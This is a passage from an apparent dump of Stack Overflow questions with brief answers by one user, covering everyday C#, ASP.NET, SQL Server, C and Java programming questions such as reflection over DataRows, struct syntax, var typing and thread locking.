","33708","Mehrdad Afshari","<p>You could try dynamic method dispatching by using reflection (it's pretty costly, performance-wise):</p>

<pre><code>object items = _repository.GetType().GetMethod(""ListAll""+type+""Exceptions"")
                          .Invoke(_repository, null);
</code></pre>

<p>I would write a <code>switch</code> statement (not <code>if/else</code>) for 10 cases however. It's not that bad.</p>

<pre><code>switch (type) {
    case ""ladm"": return View(""ladm"", _repository.ListAllLADMExceptions());
    case ""...."": return View(....);
}
</code></pre>
"
"<p>I'm using SQL Server 2008. My database is almost 2GB in size. 90% of it is one table (as per sp_spaceused), that I need don't for most of my work. </p>

<p>I was wondering if it was possible to take this table, and have it backed up in a separate file, allowing me to transfer the important data on a more frequent basis than this one. </p>

<p>My guess is the easiest way to do this is create a new database, create the table there, copy the table contents to the new database, drop the table relationships, drop the table, create a view pointing to the other database and use that view in my applications. </p>

<p>However, I was wondering if you had any pointers to different strategies that I may not be aware of at this point. </p>
","33708","Mehrdad Afshari","<p>I suggest the filegroup solution. However to copy a table from a database to another you can do this trick:</p>

<pre><code>SELECT * INTO MyNewDatabase..MyTable FROM MyOldDatabase..MyTable
</code></pre>
"
"<p>I would like to have a feature in my iphone application that would start playing a file in my ipod section of the iphone.  Does the SDK allow calls to this?  Is there a simple way to start a song from my application other than using the iphones native interface?</p>
","33708","Mehrdad Afshari","<p>No, I think the official iPhone OS 2.0 SDK does not allow this.</p>
"
"<p>I need to create a data transfer object, which I will use for storing the records retrieved from database. In this data transfer object, I need to declare a numeric field. For that which one is better - <strong>int</strong> or <strong>Integer</strong></p>

<p>If I am defining the field as Integer, will there be any performance impact because of 'Integer' type if I am going to retrieve more than 2000 records from DB!?</p>

<p>Thanks in advance.</p>
","33708","Mehrdad Afshari","<p><code>Integer</code> is theoretically slower than <code>int</code>, however the performance impact should be minimal unless you are crunching numbers. Also JIT optimizations will reduce the performance loss.</p>

<p>Use the one that better suits your situation in terms of primitive or reference type.</p>
"
"<p>On a dual quad-core <a href=""http://msdn.microsoft.com/en-us/library/ms683213%28VS.85%29.aspx"" rel=""nofollow"">GetProcessAffinityMask</a> (or the dialog from ""Set affinity"" in taskman.exe) will report eight logical processors. How do I find out which logical processor is on which physical processor? Especially: which logical processors are on the same physical processor?</p>

<p><strong>EDIT:</strong> If it is not possible to do this programmatically, do anyone just know what the normal mapping is? Are the first four on the first processor and the second four on the second or are the odd numbered on the first and the even numbered on the second?</p>
","33708","Mehrdad Afshari","<p>You can use <code>Win32_Processor</code> WMI class to query the number of cores, number of logical processors, architecture, cache memory and other information about the CPUs on the system.</p>

<p>To query information about the relationship between the logical processors in a system, you can use <a href=""http://msdn.microsoft.com/en-us/library/ms683194(VS.85).aspx"">GetLogicalProcessorInformation</a> API function.</p>
"
"<p>All of a sudden our VB ASP.Net 2.0 WebSite Project started complaining that Exception was not defined.</p>

<p>I have discovered that if I add ""Imports System"" to the header, or explicitly use System.Exception that it works, but this error permeates a lot of other System descendants like the Data namespace, and the DateTime object.  We have hundreds and hundreds of pages, so adding Imports System to all of them not only would be time consuming, but it seems like a band-aid fix to the problem.</p>

<p>I have checked the Project->Property Pages->References, and the web.config file, and the assembly is imported into the project, it is just not being ""Auto Imported"" into the Class Files like it USUALLY is.  Note this does not JUST affect CodeBehind, but All className.vb files.</p>

<p>I would like to fix this problem, but more importantly would like to understand what could cause the System namespace to all of a sudden stop being auto imported.  There is obviously some file change that caused this, as my co-worker started seeing the problem this morning after he did a Full-Get on the project.</p>

<p>MORE: The Web.Config file located in the Windows\Microsoft.Net...\Config\Web.Config file does have the , and System is added.  Adding the  tags, and adding System to the LOCAL web.config did nothing to mitigate the problem. </p>

<p>Any help would be appreciated.  First SO Question, so I hope I was descriptive enough.</p>
","33708","Mehrdad Afshari","<p>Alter the Web.config file and add the namespaces you want under the <code>&lt;pages&gt;</code> tag in <code>&lt;system.web&gt;</code>:</p>

<pre><code>&lt;pages&gt;
	&lt;namespaces&gt;
		&lt;add namespace=""System""/&gt;
		&lt;add namespace=""System.Data""/&gt;
		&lt;add namespace=""System.Web""/&gt;
		&lt;add namespace=""System.Web.UI""/&gt;
		&lt;add namespace=""System.Xml""/&gt;
		&lt;add namespace=""System.Data.SqlClient""/&gt;
		&lt;add namespace=""System.Collections.Generic""/&gt;
	&lt;/namespaces&gt;
&lt;/pages&gt;
</code></pre>
"
"<p>Can you guys tell me the difference between them?</p>

<p>BTW is there something called C++ library or C library??</p>

<p>Thanks.</p>

<p>Dazza</p>
","33708","Mehrdad Afshari","<p>C++ standard library is a term to define the standard library that a minimum conforming compiler/toolset should have. C++ runtime library is the library shipped with the toolset to provide standard library functionality, and probably some internal stuff the compiler might need. In fact, those terms are often interchangeable. </p>
"
"<p>I have a foler called A  and inside A, i have 2 folders B and C, B is having a child folder called child B,now i have a program in C .from C I need to get the PHysical path of childB
When i am giving Server.MapPath(""../B/childB/"")
It is showing.Error.Can anybody tell me how to solve this ?</p>
","33708","Mehrdad Afshari","<p>For security reasons, <code>MapPath</code> won't resolve paths outside the current application.</p>
"
"<p>Let's say I have an Array of numbers: <code>[2,3,3,4,2,2,5,6,7,2]</code></p>

<p>What is the best way to find the minimum or maximum value in that Array?</p>

<p>Right now, to get the maximum, I am looping through the Array, and resetting a variable to the value if it is greater than the existing value:</p>

<pre><code>var myArray:Array /* of Number */ = [2,3,3,4,2,2,5,6,7,2];

var maxValue:Number = 0;

for each (var num:Number in myArray)
{
    if (num &gt; maxValue)
        maxValue = num;
}
</code></pre>

<p>This just doesn't seem like the best performing way to do this (I try to avoid loops whenever possible).</p>
","33708","Mehrdad Afshari","<p>Depends on what you call ""best."" From a theoretical point of view, you cannot solve the problem in less than <code>O(n)</code> in a deterministic Turing machine.</p>

<p>The naive algorithm is too loop and update min, max. However, a recursive solution will require less comparisons than naive algorithm, if you want to get min, max simultaneously (it isn't necessarily faster due to function call overhead).</p>

<pre><code>struct MinMax{
   public int Min,Max;
}

MinMax FindMinMax(int[] array, int start, int end) {
   if (start == end)
      return new MinMax { Min = array[start], Max = array[start] };

   if (start == end - 1)
      return new MinMax { Min = Math.Min(array[start], array[end]), Max = Math.Max(array[start], array[end]) } ;

   MinMax res1 = FindMinMax(array, start, (start + end)/2);
   MinMax res2 = FindMinMax(array, (start+end)/2+1, end);
   return new MinMax { Min = Math.Min(res1.Min, res2.Min), Max = Math.Max(res1.Max, res2.Max) } ;
}
</code></pre>

<p>The simplest solution would be to sort and get the first and last item, though it's obviously not the fastest ;)</p>

<p>The best solution, performance-wise, to find the minimum <b>or</b> maximum is the naive algorithm you written (with a single loop). </p>
"
"<p>If you don't need to do much serious programming on it but only the kind of problem you would be asked to do in a CS classroom, is one of those 8-10 inch laptops tolerable to do programming on?</p>

<p>In my case the alternative for class would be either a huge heavy laptop (not good for the back) or nothing at all. I've got a good setup at home no matter what.</p>

<p>Kinda along the same lines as this: <a href=""http://stackoverflow.com/questions/147444/"">Minimum development computer requirements?</a> but for a different environment.</p>

<p><hr /></p>

<p><em>Update:</em> I get the Aspire One 1.6Ghz, 1GB Ram, 140GB HD. I don't even notice the smaller screen most of the time but when things don't fit, it really is cramped. Also the arrow keys and about 3/4 height (on a 89% KB that ends up feeing about 1/2 height) and the home/end and PgUp/PgDn keys are in an odd spot and overloaded using the Fn key.</p>

<p>All said I like it a lot. It runs eclipse/Java just fine and does well for downloading stuff for class and what not.</p>
","33708","Mehrdad Afshari","<p>A programmer without a good keyboard is like a bee without honey.</p>

<p>Surely, its better than nothing. But cheap netbooks are both underpowered and lack a good display/keyboard. I personally do a lot of my work on my MacBook Air (underpowered, but at least the keyboard/display is acceptable). I think you can go with a relatively cheap 13.3"" from Dell (Vostro 1310, which is not that heavy) or even better, you could get yourself a MacBook with student discounts or something!</p>

<p>I know a guy who mostly work with open source stuff (he's a Linux/Python fan). He does his work in emacs and owns a Lenovo X61. It works for him since emacs is not VS/Eclipse (however I still can't type with his keyboard).</p>
"
"<p>update:  I know there is no one best way to do everything.  Sorry for not saying that right off.  In the context of the data-access tutorials, if you had to do the project he did in that tutorial, would you do what he did or would use use MVC, if you had to choose one of them?</p>

<p><strong>Update:</strong> Is MVC the more appropriate way to program asp.net applications, instead of the tutorials found here:</p>

<p><a href=""http://www.asp.net/Learn/data-access/"" rel=""nofollow"">http://www.asp.net/Learn/data-access/</a></p>

<p><strong>Original:</strong></p>

<p>I ask, because I initially learned about MVC with Java applications, then things like RoR, and Django.  These other projects and companies spoke as if MVC had been around for a very long time, and from what I found out it had.  Then Microsoft started putting MVC into the .net framework.</p>

<p>I ask because I don't know how to design things very well and thought I was doing well to emulate what's on the asp.net site with Scott Mitchell's tutorial.  I thought that creating abstract layers in a BLL was the way to go until I found out about MVC and now asp.net's MVC.</p>

<p>I honestly don't know what the ""right"" way is to do things.  I just create what I need, but I can't help feel like I am missing something.</p>

<p>Is MVC the correct way to start doing things in large projects, specifically I mean MVC and ASP.NET, but could just as well mean PHP and one of their MVC frameworks.</p>

<p>I'd like to settle on a standard way of doing things...for now anyway.</p>

<p>And, out of curiosity, why did Microsoft only now start doing MVC?</p>

<p><strong>UPDATE:</strong> Is MVC better than the current tutorial set on asp.net?</p>

<p>I'm referring to the Scott Mitchell tutorials where he creates the BLL for abstraction.  Or is that a linq question as well.  I should have said that I understand the need for keeping logic and presentation separate but unsure the best way to do it.  I was using the asp.net tutorials.  It worked fine.  Then I found out the rest of the world, as I saw it anyway, was using MVC.  Then Microsoft started developing MVC, so to me the other method seems obsolete and the wrong way to do things.</p>
","33708","Mehrdad Afshari","<p>No, it's not the only best way to do things.</p>

<p>MVC is just a design pattern. The goal of all design patterns is simplicity. So as long as it makes your design simpler, go with it. If it makes things more complex for your specific application, try a different approach.</p>

<p>Unfortunately, some people think if they see a pattern, they should use it. It's just not true. Design patterns don't inherently make your application better. They are not an end. They are a means to an end (which is simplicity). So you should use them only if they are worth it.</p>

<p>In my opinion, over-architecting things without a good reason is worse than writing code without any specific design.</p>

<p><b>EDIT:</b> Regarding ASP.NET MVC: I have a negative personal bias toward ASP.NET Web forms. Before MVC, I did most of the dynamic aspects of advanced projects by writing custom handlers to have fine grained control over the HTML. Web Forms make Web development very easy but they have particularly a couple things that are good but sometimes are problematic. The first of which is <code>ViewState</code> and the second is complex <code>WebControl</code> architecture. Don't get me wrong. Those are signs of brilliance of ASP.NET. I haven't seen a single platform for Web development as easy as ASP.NET Web Forms and this is only because of great <code>WebControl</code> support which requires <code>ViewState</code>. However, in some projects, you want to have precise control on rendered HTML (specially when you have some client-side logic). You also want to make server side code maintainable in large projects. In those areas, ASP.NET MVC really shines. But I think ASP.NET Web Forms will remain a great technology where it's more applicable. After all, as I said regarding design patterns in general, you should carefully evaluate your design to see which one better fits your needs.</p>

<p>Specifically, about data access, MVC usually requires more code than Web Forms counterparts. For presenting tabular data (i.e where GridView is applicable), I think ASP.NET Web Forms is the easier way to accomplish things. However, most data driven Web apps are not just manipulating a table directly in a database. They have complex layout. StackOverflow is a great example of this. It is certainly data driven, but ASP.NET MVC better suits it.</p>
"
"<p>Other than the Java language itself, you have to learn the java framework.   Similiar to how you have to learn the .net framework in addition to the language (C#/VB).</p>

<p>How important is it to know unix? Or rather, what unix areas should one focus on?</p>

<p>Seeing as many people run java based applications (desktop/web) on unix boxes, <strong>what sort of unix skills do you need</strong>?  Are we just talking basic directory traversing, creating files, etc or is there much more to it?</p>
","33708","Mehrdad Afshari","<p>I think your metaphor means you should learn Java library in addition to the language itself.</p>

<p>Certainly knowing UNIX will help a bit as it increases your general knowledge, but I don't think it's really directly related to Java at all.</p>
"
"<p>I'm writing a simplistic game to learn get some more C++ experience, and I have an idea where I feel polymorphism <em>almost</em> works, but doesn't. In this game, the <code>Party</code> moves fairly linearly through a <code>Map</code>, but can occasionally encounter a <code>Fork</code> in the road. A fork is (basically) an <code>std::vector&lt;location*&gt;</code>.Originally I was going to code something like the following into the a <code>Party</code> member function:</p>

<pre><code>if(!CurrLocation-&gt;fork_.empty())
   // Loop through forks and show options to the player, go where s/he wants
else
  (CurrLocation++)
</code></pre>

<p>But I was wondering if some variant of the following might be better:</p>

<pre><code>CurrLocation = CurrLocation-&gt;getNext();
</code></pre>

<p>With Fork actually being derived from Location, and overloading some new function <code>getNext()</code>. But in the latter case, the <code>location</code> (a low level structure) would have to be the one to present the message to the user instead of ""passing this back up"", which I don't feel is elegant as it couples <code>location</code> to <code>UserInterface::*</code>.</p>

<p>Your opinions?</p>
","33708","Mehrdad Afshari","<p>You should use polymorphism as long as it makes sense and simplifies your design. You shouldn't use it just because it exists and has a fancy name. If it does make your design simpler, then it's worth the coupling.</p>

<p>Correctness and simplicity should be the ultimate goal of every design decision.</p>
"
"<p><img src=""http://barbarosalp.com/questions/list.png"" alt=""alt text"" /></p>

<p>Hi,</p>

<p>As you can see on the picture above i have a List ""keys"" filled with Request.Form.AllKeys which a key starts with ""txt"".</p>

<p>I want to group them by their last id, for example</p>

<pre><code>[0] ""txtTitle:2"" ""txtDescription:2""
[1] ""txtTitle:3"" ""txtDescription:3""
</code></pre>

<p>How can i achive this with lambda expression.</p>

<p>Thank you very much</p>
","33708","Mehrdad Afshari","<pre><code>var groups = keys.GroupBy(e=&gt;e.Split(':').Last());
</code></pre>
"
"<p>I often find myself confused with how the terms 'arguments' and 'parameters' are used. They seem to be used interchangeably in the programming world.</p>

<p>What's the correct convention for their use?</p>
","33708","Mehrdad Afshari","<p>Parameters are the things defined by functions as input, arguments are the things passed as parameters.</p>

<pre><code>void foo(int bar) { ... }

foo(baz);
</code></pre>

<p>In this example, <code>bar</code> is a parameter for <code>foo</code>. <code>baz</code> is an argument passed to <code>foo</code>.</p>
"
"<p>In C, is there a difference between writing ""struct foo"" instead of just ""foo"" if foo is a struct?</p>

<p>For example:</p>

<pre><code>struct sockaddr_in sin;
struct sockaddr *sa;

// Are these two lines equivalent?
sa = (struct sockaddr*)&amp;sin;
sa = (sockaddr*)&amp;sin;
</code></pre>

<p>Thanks /Erik</p>
","33708","Mehrdad Afshari","<p>In fact, in standard ""C"" it's required to specify <code>struct</code> keyword. This is optional in C++.</p>

<p>This is the reason some people define structs like this:</p>

<pre><code>typedef struct foo { ... } bar;
</code></pre>

<p>to be able to use <code>bar</code> instead of <code>struct foo</code>. However, some C compilers do not enforce this rule.</p>
"
"<p>I'm looking for good free bug-tracking software.</p>

<p>I notice that some (i.e. Mantis) are GPL-licensed.</p>

<p>Am I allowed to use Mantis to track bugs for commercial, non-GPL software that we are writing?</p>
","33708","Mehrdad Afshari","<p>Nope, absolutely not. It's not considered derivative work.</p>
"
"<p>Some existing web services I consume have methods that look something like this:</p>

<pre><code>List&lt;Employee&gt; employees = 
        employeeService.GetEmployees(accessKey, allDepartments);
</code></pre>

<p>The accessKey serves two purposes; it acts as both authentication and identification.  Only valid access codes are responded to (authentication) and it services as a link to a particular client's data.</p>

<p>If the services were to be done a restful manner I'm not sure how this would be achieved.  I definitely would not want to do something like this:</p>

<pre><code>http://www.business.com/&lt;GuidHere&gt;/Employees/
</code></pre>

<p>Since this would show the accessKey, which is somewhat secret, (ie, its usually in an encrypted file on the client which uses this) we can't show the GUID in a URI.  How is something like this achieved using a restful architecture?</p>
","33708","Mehrdad Afshari","<p>You could send the authentication token using HTTP headers.</p>
"
"<p>If my program was to hit the database with multiple updates would it be better to pull in the tables into a dataset, change the values and then send it back to the database. Does anyone know what's more expensive?</p>
","33708","Mehrdad Afshari","<p>Depends on the size of the <code>DataSet</code>. If your data set is too large, it doesn't worth it. Otherwise, it might be a good approach. However, nothing prevents you to do multiple updates in a batch even without using a <code>DataSet</code>. You could write a stored procedure with an <code>XML</code> parameter that will do batch updates for you.</p>
"
"<p>I'm currently using ReSharper's 30-day trial, and so far I've been impressed with the suggestions it makes. One suggestion puzzles me, however.</p>

<p>When I explicitly define a variable, such as:</p>

<pre><code>List&lt;String&gt; lstString = new List&lt;String&gt;();
</code></pre>

<p>ReSharped adds a little squiggly green line and tells me to:</p>

<blockquote>
  <p>Use implicitly type local variable declaration.</p>
</blockquote>

<p>If I then follow its suggestion, ReSharper changes the line of code to:</p>

<pre><code>var lstString = new List&lt;String&gt;();
</code></pre>

<p>So, is there some sort of performance gain to be had from changing the <code>List&lt;String&gt;</code> to a <code>var</code>, or is this merely a peculiarity of ReSharper? I've always been taught that explicitly defining a variable, rather than using a dynamic, is more optimal.</p>
","33708","Mehrdad Afshari","<p>Nope. They emit the <b>exact same IL</b>.</p>

<p>It's just a matter of style.</p>

<p><code>var</code> has the benefit that makes it easier for you to change the return type of functions without altering other parts of source code. For example change the return type from <code>IEnumerable&lt;T&gt;</code> to <code>List&lt;T&gt;</code>. However, it might make it easier to introduce bugs.</p>
"
"<p>I distinctly remember that, at one time, the guideline pushed by Microsoft was to add the ""Base"" suffix to an abstract class to obviate the fact that it was abstract. Hence, we have classes like <code>System.Web.Hosting.VirtualFileBase</code>, <code>System.Configuration.ConfigurationValidatorBase</code>, <code>System.Windows.Forms.ButtonBase</code>, and, of course, <code>System.Collections.CollectionBase</code>.</p>

<p>But I've noticed that, of late, a lot of abstract classes in the Framework don't seem to be following this convention. For example, the following classes are all abstract but don't follow this convention:</p>

<ul>
<li><p><code>System.DirectoryServices.ActiveDirectory.DirectoryServer</code></p></li>
<li><p><code>System.Configuration.ConfigurationElement</code></p></li>
<li><p><code>System.Drawing.Brush</code></p></li>
<li><p><code>System.Windows.Forms.CommonDialog</code></p></li>
</ul>

<p>And that's just what I could drum up in a few seconds. So I went looking up what the official documentation had to say, to make sure I wasn't crazy. I found the <a href=""http://msdn.microsoft.com/en-us/library/ms229040.aspx"">Names of Classes, Structs, and Interfaces</a> on MSDN at <a href=""http://msdn.microsoft.com/en-us/library/ms229042.aspx"">Design Guidelines for Developing Class Libraries</a>. Oddly, I can find no mention of the guideline to add ""Base"" to the end of an abstract class's name. And the guidelines are no longer available for version 1.1 of the Framework.</p>

<p>So, am I losing it? Did this guideline ever exist? Has it just been abandoned without a word? Have I been creating long class names all by myself for the last two years for nothing? </p>

<p>Someone throw me a bone here.</p>

<p><strong>Update</strong>
I'm not crazy. The guideline existed. <a href=""http://blogs.msdn.com/kcwalina/archive/2005/12/16/BaseSuffix.aspx"">Krzysztof Cwalina gripes about it in 2005.</a></p>
","33708","Mehrdad Afshari","<p>I don't remember such a guideline. I believe you should use the naming that makes sense. Sometimes the abstract class is only designed to provide common functionality to some classes (as a tool), which I think should have the suffix. However, in some cases, you want to use it as the base of a polymorphism hierarchy which it's not complete itself. In those cases I suggest naming like a normal class.</p>

<p>As you see, you won't probably declare a method that accepts a ButtonBase as parameter. It's designed to provide minimal functionality for subclasses. However, you might treat a <code>ConfigurationElement</code> as an entity that has different forms but it is not complete on itself (and hence it's abstract)</p>
"
"<p>I have a GridView that is populated via a database, inside the GridView tags I have:</p>

<pre><code>&lt;Columns&gt;
  &lt;asp:TemplateField&gt;
    &lt;ItemTemplate&gt;&lt;asp:Panel ID=""bar"" runat=""server"" /&gt;&lt;/ItemTemplate&gt;
  &lt;/TemplateField&gt;
&lt;/Columns&gt;
</code></pre>

<p>Now, I want to be able to (in the code) apply a width attribute to the ""bar"" panel for each row that is generated. How would I go about targeting those rows? The width attribute would be unique to each row depending on a value in the database for that row. </p>
","33708","Mehrdad Afshari","<pre><code>&lt;asp:Panel ID=""bar"" runat=""server"" Width='&lt;%# Eval(""Width"") %&gt;' /&gt;
</code></pre>

<p>If you like, you can change <code>Eval(""Width"")</code> to the expression that calculates the width.</p>
"
"<p>When retrieving objects from an NSMutableArray in cocoa-touch is the below code ok? Should I be allocating([alloc]) new Page objects each time or is just pointing to it alright? Do I need to do anything to the Page *pageObj after, such as set it to nil?</p>

<pre><code>const char *sql = ""insert into Page(Book_ID, Page_Num, Page_Text) Values(?, ?, ?)"";
for (i = 0; i &lt; ([[self pagesArray] count] - 1); i++) {
    if(addStmt == nil) {
        if(sqlite3_prepare_v2(database, sql, -1, &amp;addStmt, NULL) != SQLITE_OK) {
            NSAssert1(0, @""Error while creating add statement. '%s'"", sqlite3_errmsg(database));
        }
    }
    Page *pageObj = [[self pagesArray] objectAtIndex:i];
    if(pageObj.isNew) {
        sqlite3_bind_int(addStmt, 1, self.book_ID); 
        sqlite3_bind_int(addStmt, 2, pageObj.page_Number);  
        sqlite3_bind_text(addStmt, 3, [[pageObj page_Text] UTF8String], -1, SQLITE_TRANSIENT);
        if(SQLITE_DONE != sqlite3_step(addStmt)) {
            NSAssert1(0, @""Error while inserting data. '%s'"", sqlite3_errmsg(database));
        }
        NSLog(@""Inserted Page: %i into DB. Page text: %@"", pageObj.page_Number, pageObj.page_Text);
    }
    //Reset the add statement.
    sqlite3_reset(addStmt);                     
}
</code></pre>

<p>Thanks. I also understand this should probably be in a transaction but I didn't quite get that working just yet.</p>
","33708","Mehrdad Afshari","<p>Of course not. You have allocated it before and are just referencing the same object. No need to reallocate. Also you don't need to set it to nil.</p>
"
"<p>Sorry for such a newbie question but there is something I do not quite understand the difference between a C# reference and a pointer. They both point to a place in memory don't they? The only difference I can figure out is that pointers are not as clever, cannot point to anything on the heap, are exempt from garbage collection, and can only reference struts or base types.</p>

<p>One of the reasons I ask is that there is a perception that people need to understand pointers (from C I guess) well to be a good programmer. That a lot of people who leant higher level langauges miss this out and therefore have this weakness.</p>

<p>I just don't get what is so complex about a pointer? It is basically just a reference to a place in memory is it not? Can return it's location, or can be used to interact that the object in that location directly? </p>

<p>So have a missed a massive point?</p>
","33708","Mehrdad Afshari","<p>C# references can, and will be relocated by garbage collector but normal pointers are static. This is why we use <code>fixed</code> keyword when acquiring a pointer to an array element, to prevent it from getting moved.</p>

<p>EDIT: Conceptually, yes. They are more or less the same.</p>
"
"<p>I am currently building a method that takes an object that is of type <code>DataRow</code> from a typed DataSet, and then returning a string in <a href=""http://en.wikipedia.org/wiki/Json"" rel=""nofollow"">JSON</a> format of the fields in the DataRow (for use in a Web Service).</p>

<p>By using <code>System.Reflection</code>, I am doing something like this : </p>

<pre><code>public string getJson(DataRow r)
    {
        Type controlType = r.GetType();
        PropertyInfo[] props = controlType.GetProperties();
        foreach (PropertyInfo controlProperty in props)
        {

        }
        return """";
    }
</code></pre>

<p>And then in the <code>foreach</code> statement, I would iterate every field and get the field name and value, and format it into JSON.</p>

<p><hr /></p>

<p>The problem is that when iterating over the <code>props</code> (of type <code>PropertyInfo[]</code>), I am getting properties that I do not want to be iterated over:</p>

<p><img src=""http://img88.imageshack.us/img88/2001/datarowreflectionht0.gif"" alt=""alt text"" /></p>

<p>As you can see from the above image, I only need the fields that range from <code>0 - 11</code> in the <code>props</code> array, because those are the 'real fields' of this particular typed row.</p>

<p>So my question is, <strong>How can I get the fields of the Typed DataRow only, and not the other 'metadata' ?</strong></p>

<p><hr /></p>

<p><strong>[UPDATE with Solution]</strong></p>

<p>As <a href=""http://stackoverflow.com/questions/431050/c-reflection-getting-the-fields-of-a-datarow-from-a-typed-dataset#431058"">Mehrdad Afshari</a> suggested, instead of using <code>Reflection</code>, I am using the <code>Table.Columns</code> array.  </p>

<p>Here is the completed function:</p>

<pre><code>public string GetJson(DataRow r)
{
    int index = 0;
    StringBuilder json = new StringBuilder();
    foreach (DataColumn item in r.Table.Columns)
    {
        json.Append(String.Format(""\""{0}\"" : \""{1}\"""", item.ColumnName, r[item.ColumnName].ToString()));
        if (index &lt; r.Table.Columns.Count - 1)
        {
            json.Append("", "");
        }
        index++;
    }
    return ""{"" + json.ToString() + ""}"";
}
</code></pre>
","33708","Mehrdad Afshari","<p>Why don't you use <code>row.Table.Columns</code> property instead of reflection?</p>
"
"<p>Im not sure what they're called but im referring to the</p>

<pre><code>private:
public:
protected:
    float bla1;
    float bla2;
    float bla3;
</code></pre>

<p>keywords in c++.
Is there an equivalent in c#? It seems rather tedious having to repeat yourself! ala</p>

<pre><code>protected float bla1;
protected float bla2;
protected float bla3;
</code></pre>
","33708","Mehrdad Afshari","<p>No there isn't such a thing. In fact, it's designed to be like that to make code more readable. This applies to both C# and Java.</p>
"
"<p>When doing thread synchronization in C# should I also lock an object when I read a value or just changing it?</p>

<p>for example I have Queue&lt;T&gt; object. Should I just lock it when doing the Enqueue and Dequeue or should I also lock it when checking values like Count?</p>
","33708","Mehrdad Afshari","<p>Depends on what you want to do with lock. Usually this kind of locking needs a reader/writer locking mechanism.</p>

<p>Readers/writers locking means that readers share a lock, so you can have multiple readers reading the collection simultaneously, but to write, you should acquire an exclusive lock.</p>
"
"<p>This question is inspired by Jon Skeet's answer:
<a href=""http://stackoverflow.com/questions/431091/is-there-a-c-equivalent-to-cs-access-modifier-regions#431105"">http://stackoverflow.com/questions/431091/is-there-a-c-equivalent-to-cs-access-modifier-regions#431105</a></p>

<p>He makes a comment that it is possible for the order of fields in a file to matter. I am guessing that this has to do with the order that the fields are initialized, but I think it's a dangerous enough thing to code based on this side effect that it warranted its own question and discussion. </p>

<p>Are there other thoughts around how the order of fields within your code file could be manipulated and what impact that might have?</p>
","33708","Mehrdad Afshari","<p>Yeah, it does matter when interfacing with unmanaged code.</p>
"
"<p>As an addition to my previous post on <a href=""http://stackoverflow.com/questions/409087/creating-a-web-server-in-pure-c"">Creating a web server in pure C</a>, I'm having some trouble with the Sending function. Here's two code snippets:</p>

<pre><code>int Send(char *message)
{
        int length, bytes_sent;
        length = strlen(message);

        bytes_sent = send(connecting_socket, message, length, 0);

        return bytes_sent;
}
</code></pre>

<p>This code sends void * to the current socket. Works like a charm!</p>

<p>Now here comes the SendHTML</p>

<pre><code>void SendHTML(char *Status_code, char *Content_Type, char *HTML)
{
        char *head = ""\r\nHTTP/1.1 "";
        char *content_head = ""\r\nContent-Type: "";
        char *server_head = ""\r\nServer: PT06"";
        char *length_head = ""\r\nContent-Length: "";
        char *date_head = ""\r\nDate: "";
        char *newline = ""\r\n"";
        char Content_Length[100];
        int content_length = strlen(HTML);

        sprintf(Content_Length, ""%i"", content_length);

        char *message = malloc((
                strlen(head) +
                strlen(content_head) +
                strlen(server_head) +
                strlen(length_head) +
                strlen(date_head) +
                strlen(newline) +
                strlen(Status_code) +
                strlen(Content_Type) +
                strlen(Content_Length) +
                content_length +
                sizeof(char)) * 2);

        if ( message != NULL )
        {
                time_t rawtime;

                time ( &amp;rawtime );

                strcpy(message, head);

                strcat(message, Status_code);

                strcat(message, content_head);
                strcat(message, Content_Type);
                strcat(message, server_head);
                strcat(message, length_head);
                strcat(message, Content_Length);
                strcat(message, date_head);
                strcat(message, (char*)ctime(&amp;rawtime));
                strcat(message, newline);
                strcat(message, HTML);

                Send(message);

                free(message);
        }     
}
</code></pre>

<p>If I were to add</p>

<pre><code>Send(""Oh end of HTML Sending eh?"");
</code></pre>

<p>after <code>Send(message)</code> and before <code>free(message)</code>, this isn't sent to the browser?</p>

<p>I figured this might be a HTTP 1.1 issue, does the RFC say that i can only do one Send? Does the browser Close the connection after it receives the first message?</p>

<p>How do I solve this so I could do the following:</p>

<pre><code>SendHTML(""200 OK"", ""text/plain"", ""HAaaaii!!"");
Send(""lolwut?"");
</code></pre>

<p>This should result in the Browser showing:</p>

<blockquote>
  <p>HAaaaii!!lolwut?</p>
</blockquote>
","33708","Mehrdad Afshari","<p>Do you add newline after each header?</p>

<p>You can test your application by using telnet, of course and see what's the output.</p>

<p>No, it's not required to have only one send. Assume streaming a 2GB file. It's simply not logical.</p>
"
"<p>I'm trying to build a very, very simple ""micro-webapp"" which I suspect will be of interest to a few Stack Overflow'rs if I ever get it done. I'm hosting it on my C# in Depth site, which is vanilla ASP.NET 3.5 (i.e. not MVC).</p>

<p>The flow is very simple:</p>

<ul>
<li>If a user enters the app with a URL which doesn't specify all the parameters (or if any of them are invalid) I want to just display the user input controls. (There are only two.)</li>
<li>If a user enters the app with a URL which <em>does</em> have all the required parameters, I want to display the results <em>and</em> the input controls (so they can change the parameters)</li>
</ul>

<p>Here are my self-imposed requirements (mixture of design and implementation):</p>

<ul>
<li>I want the submission to use GET rather than POST, mostly so users can bookmark the page easily.</li>
<li>I <em>don't</em> want the URL to end up looking silly after submission, with extraneous bits and pieces on it. Just the main URL and the real parameters please.</li>
<li>Ideally I'd like to avoid requiring JavaScript at all. There's no good reason for it in this app.</li>
<li>I want to be able to access the controls during render time and set values etc. In particular, I want to be able to set the default values of the controls to the parameter values passed in, if ASP.NET can't do this automatically for me (within the other restrictions).</li>
<li>I'm happy to do all the parameter validation myself, and I don't need much in the way of server side events. It's really simple to set everything on page load instead of attaching events to buttons etc.</li>
</ul>

<p>Most of this is okay, but I haven't found any way of <em>completely</em> removing the viewstate and keeping the rest of the useful functionality. Using the post from <a href=""http://aspnyc.blogspot.com/2007/10/how-to-completely-disable-viewstate.html"">this blog post</a> I've managed to avoid getting any actual <em>value</em> for the viewstate - but it still ends up as a parameter on the URL, which looks really ugly.</p>

<p>If I make it a plain HTML form instead of an ASP.NET form (i.e. take out <code>runat=""server""</code>) then I don't get any magic viewstate - but then I can't access the controls programmatically.</p>

<p>I <em>could</em> do all of this by ignoring most of ASP.NET and building up an XML document with LINQ to XML, and implementing <code>IHttpHandler</code>. That feels a bit low level though.</p>

<p>I realise that my problems could be solved by either relaxing my constraints (e.g. using POST and not caring about the surplus parameter) or by using ASP.NET MVC, but are my requirements really unreasonable?</p>

<p>Maybe ASP.NET just doesn't scale <em>down</em> to this sort of app? There's a very likely alternative though: I'm just being stupid, and there's a perfectly simple way of doing it that I just haven't found.</p>

<p>Any thoughts, anyone? (Cue comments of how the mighty are fallen, etc. That's fine - I hope I've never claimed to be an ASP.NET expert, as the truth is quite the opposite...)</p>
